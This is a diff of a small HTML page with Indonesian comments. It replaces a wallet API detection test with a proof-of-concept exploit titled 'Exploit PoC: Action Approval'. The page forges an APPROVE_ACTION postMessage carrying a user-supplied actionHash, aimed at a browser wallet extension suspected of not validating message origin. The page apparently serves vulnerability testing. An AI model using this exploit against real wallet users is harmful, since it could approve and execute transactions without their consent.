@@ -1,50 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Test: Wallet API Interactor</title>
+    <title>Exploit PoC: Action Approval</title>
 </head>
 <body>
-    <h1>API Interaction Test</h1>
-    <button id="checkApi">Deteksi Wallet API</button>
-    <button id="triggerTx">Coba Panggil Fungsi Transaksi</button>
-    <pre id="log" style="background: #eee; padding: 10px;"></pre>
+    <h1>Security Test: Transaction Approval</h1>
+    <input type="text" id="actionHash" placeholder="Masukkan actionHash dari EXECUTE_TRANSACTION_RES" style="width: 300px;">
+    <button id="approveBtn">Approve & Execute Action</button>
 
     <script>
-        const log = (msg) => document.getElementById('log').innerText += msg + '\n';
+        document.getElementById('approveBtn').addEventListener('click', () => {
+            const hash = document.getElementById('actionHash').value;
 
-        // 1. Deteksi apakah ada objek yang disuntikkan oleh dompet
-        document.getElementById('checkApi').addEventListener('click', () => {
-            const detected = [];
-            // Mencoba mendeteksi beberapa objek umum yang disuntikkan dompet
-            if (window.ethereum) detected.push('window.ethereum');
-            if (window.argent) detected.push('window.argent'); // Contoh jika dompet menyuntikkan objek sendiri
-            
-            log("API Terdeteksi: " + (detected.length > 0 ? detected.join(', ') : "Tidak ditemukan API umum."));
-        });
-
-        // 2. Coba berinteraksi dengan API yang terdeteksi
-        document.getElementById('triggerTx').addEventListener('click', async () => {
-            if (window.ethereum) {
-                try {
-                    log("Mencoba meminta akses akun...");
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    log("Akun ditemukan: " + accounts[0]);
-                    
-                    log("Mencoba mengirim transaksi (Simulasi)...");
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [{
-                            from: accounts[0],
-                            to: '0x0000000000000000000000000000000000000000',
-                            value: '0x0',
-                        }],
-                    });
-                } catch (e) {
-                    log("Error: " + e.message);
+            // Struktur pesan nyata berdasarkan file background/actionMessaging.ts
+            const msg = {
+                type: "APPROVE_ACTION",
+                data: {
+                    actionHash: hash
                 }
-            } else {
-                log("API tidak ditemukan, tidak bisa memicu transaksi.");
-            }
+            };
+
+            // Mengirim pesan ke ekstensi melalui window.postMessage
+            // Jika dompet rentan, ia akan memproses APPROVE_ACTION tanpa validasi origin
+            window.postMessage(msg, window.location.origin);
+            
+            console.log("APPROVE_ACTION dikirim dengan Hash:", hash);
         });
     </script>
 </body>
